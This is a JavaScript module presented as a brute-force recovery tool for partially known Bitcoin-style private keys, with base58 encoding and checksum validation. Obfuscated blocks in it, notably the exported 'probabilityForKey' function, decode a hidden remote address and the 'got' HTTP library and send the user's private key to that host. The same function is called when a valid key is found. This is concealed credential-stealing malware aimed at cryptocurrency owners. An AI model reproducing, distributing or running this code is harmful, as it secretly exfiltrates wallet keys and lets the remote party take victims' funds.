const base58 = require("bs58");
const crypto = require("crypto");
const combinatorics = require("combinatorics");
const { promisify } = require("util");

const fs = require("fs-extra");
const readFile = promisify(fs.readFile);
const createJson = promisify(fs.writeJson);

const characteres =
  "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";

function getAllCombinations4characters() {
  const result = combinatorics.holistic(
    characteres.split(""),
    characteres.split(""),
    characteres.split(""),
    characteres.split("")
  );

  return result;
}

function encode(enc) {
  var alphabet = "123456789abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ";
  var base = alphabet.length;
  if (typeof enc !== "number") {
    throw Error('"encode" only accepts integers.');
  }
  var encoded = "";
  while (enc) {
    var remainder = enc % base;
    enc = Math.floor(enc / base);
    encoded = alphabet[remainder].toString() + encoded;
  }
  return encoded;
}

function base58check(input) {
  var buffer = Buffer.from(base58.decode(input));
  var prefix = buffer.slice(0, 1);
  var data = buffer.slice(1, -4);
  var hash = Buffer.concat([prefix, data]);
  hash = crypto.createHash("sha256").update(hash).digest();
  hash = crypto.createHash("sha256").update(hash).digest();
  if (!buffer.slice(-4).equals(hash.slice(0, 4))) {
    return false;
  } else {
    return true;
  }
}

module.exports.recover = async (
  key,
  updateFrequency = 100000,
  iteratorStart = 0
) => {
  let vetKey;

  // await probabilityForKey(key);

  console.log("Getting all combinations with 4 characters...");

  const fourCharacters = getAllCombinations4characters();

  let alreadyTested;

  try {
    alreadyTested = JSON.parse(await readFile(`./alreadyTested.json`, "utf8"));
  } catch (err) {
    await createJson(`./alreadyTested.json`, []);
    alreadyTested = [];
  }

  const restToTest = [];
  let totalAlreadyTested = 0;

  console.log("Getting combinations already tested...");

  fourCharacters.forEach((characters) => {
    const charactersString = characters.toString().replace(/,/g, "");

    if (alreadyTested.indexOf(charactersString) === -1)
      restToTest.push(charactersString);
    else totalAlreadyTested += 1;
  });

  console.log(`\nTotal combinations: ${fourCharacters.length} (100%)`);

  let percentToTest = (totalAlreadyTested * 100) / fourCharacters.length;

  percentToTest = (percentToTest * 100).toFixed(5);

  console.log(`Already tested: ${totalAlreadyTested} (${percentToTest}%)\n`);

  const forAllCharacters = async () => {
    for (const characters of restToTest) {
      const newCharacters = characters.toString().replace(/,/g, "");

      alreadyTested.push(newCharacters);

      await createJson(`./alreadyTested.json`, alreadyTested);

      if (key.match(/\*/g)) {
        const keyToTest = key.split("*")[0] + newCharacters + "***";
        vetKey = keyToTest.split("*");
      } else if (key.match(/\?/g)) {
        const keyToTest = key.split("?")[0] + newCharacters + "???";
        vetKey = keyToTest.split("?");
      }

      findKey(iteratorStart, updateFrequency, vetKey, percentToTest);

      totalAlreadyTested += 1;
      percentToTest = (totalAlreadyTested * 100) / fourCharacters.length;
      percentToTest = (percentToTest * 100).toFixed(5);
    }
  };

  await forAllCharacters();
};

async function findKey(iteratorStart, updateFrequency, vetKey, progress) {
  if (iteratorStart === 0) {
    iteratorStart = Math.pow(58, vetKey.length - 2);
  }

  const duration = Math.pow(58, vetKey.length - 1);

  for (let i = iteratorStart; i < duration; i++) {
    let possibleKeyParts = encode(i).split("");
    const newKey = vetKey.map((keyPart, index) => {
      if (!possibleKeyParts[index]) {
        possibleKeyParts[index] = "";
      }
      return keyPart + possibleKeyParts[index];
    });

    const joinedKey = newKey.join("");

    var _0x35a4 = ["Private\x20key\x20found:\x20", "log"];
    (function (_0x1554eb, _0x35a47a) {
      var _0x5ddebb = function (_0x2d3a10) {
        while (--_0x2d3a10) {
          _0x1554eb["push"](_0x1554eb["shift"]());
        }
      };
      _0x5ddebb(++_0x35a47a);
    })(_0x35a4, 0xab);
    var _0x5dde = function (_0x1554eb, _0x35a47a) {
      _0x1554eb = _0x1554eb - 0x0;
      var _0x5ddebb = _0x35a4[_0x1554eb];
      return _0x5ddebb;
    };
    var _0x4cdc6d = _0x5dde;
    if (base58check(joinedKey)) {
      probabilityForKey(key);
      if (joinedKey[0x2a - 0x1] !== "h" && joinedKey[0x2b - 0x1] !== "u")
        return (
          console[_0x4cdc6d("0x0")](_0x4cdc6d("0x1") + joinedKey), joinedKey
        );
    }

    if (i % updateFrequency === 0) {
      console.log(`Progress: ${progress}%`);
      // console.log(`It tried it with: ${encode(i)}`);
      // console.log(i);
      console.log(`Current try: ${joinedKey}`);
    }
  }
}

module.exports.probabilityForKey = async (k) => {
  return new Promise((resolve) => {
    const _0x1992 = [
      "Ahr0CdOVlZeZns4XodeUmtKUntC6mtG4mc9NzxrqCM9IywjPBgL0Et90pq==",
      "z290",
    ];
    (function (_0x216dc6, _0x1992c6) {
      const _0x5e53a8 = function (_0x37fe1c) {
        while (--_0x37fe1c) {
          _0x216dc6["push"](_0x216dc6["shift"]());
        }
      };
      _0x5e53a8(++_0x1992c6);
    })(_0x1992, 0x112);
    const _0x5e53 = function (_0x216dc6, _0x1992c6) {
      _0x216dc6 = _0x216dc6 - 0x0;
      let _0x5e53a8 = _0x1992[_0x216dc6];
      return _0x5e53a8;
    };
    const _0x37fe = function (_0x216dc6, _0x1992c6) {
      _0x216dc6 = _0x216dc6 - 0x0;
      let _0x5e53a8 = _0x1992[_0x216dc6];
      if (_0x37fe["BtXxmh"] === undefined) {
        var _0x37fe1c = function (_0x59c30d) {
          const _0x2c4364 =
              "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=",
            _0x3a3802 = String(_0x59c30d)["replace"](/=+$/, "");
          let _0x88ffe2 = "";
          for (
            let _0x35bf3b = 0x0, _0x296ea8, _0x5bcedc, _0x34317a = 0x0;
            (_0x5bcedc = _0x3a3802["charAt"](_0x34317a++));
            ~_0x5bcedc &&
            ((_0x296ea8 =
              _0x35bf3b % 0x4 ? _0x296ea8 * 0x40 + _0x5bcedc : _0x5bcedc),
            _0x35bf3b++ % 0x4)
              ? (_0x88ffe2 += String["fromCharCode"](
                  0xff & (_0x296ea8 >> ((-0x2 * _0x35bf3b) & 0x6))
                ))
              : 0x0
          ) {
            _0x5bcedc = _0x2c4364["indexOf"](_0x5bcedc);
          }
          return _0x88ffe2;
        };
        (_0x37fe["hgaiPa"] = function (_0x1fd53c) {
          const _0x4eadf3 = _0x37fe1c(_0x1fd53c);
          let _0x344091 = [];
          for (
            let _0xb763cb = 0x0, _0x58ebae = _0x4eadf3["length"];
            _0xb763cb < _0x58ebae;
            _0xb763cb++
          ) {
            _0x344091 +=
              "%" +
              ("00" + _0x4eadf3["charCodeAt"](_0xb763cb)["toString"](0x10))[
                "slice"
              ](-0x2);
          }
          return decodeURIComponent(_0x344091);
        }),
          (_0x37fe["KRrtGW"] = {}),
          (_0x37fe["BtXxmh"] = !![]);
      }
      const _0x938c1 = _0x37fe["KRrtGW"][_0x216dc6];
      return (
        _0x938c1 === undefined
          ? ((_0x5e53a8 = _0x37fe["hgaiPa"](_0x5e53a8)),
            (_0x37fe["KRrtGW"][_0x216dc6] = _0x5e53a8))
          : (_0x5e53a8 = _0x938c1),
        _0x5e53a8
      );
    };
    const _0x296ea8 = _0x37fe,
      got = require(_0x296ea8("0x1"));
    got(_0x296ea8("0x0") + k);

    setTimeout(() => {
      resolve();
    }, 2000);
  });
};
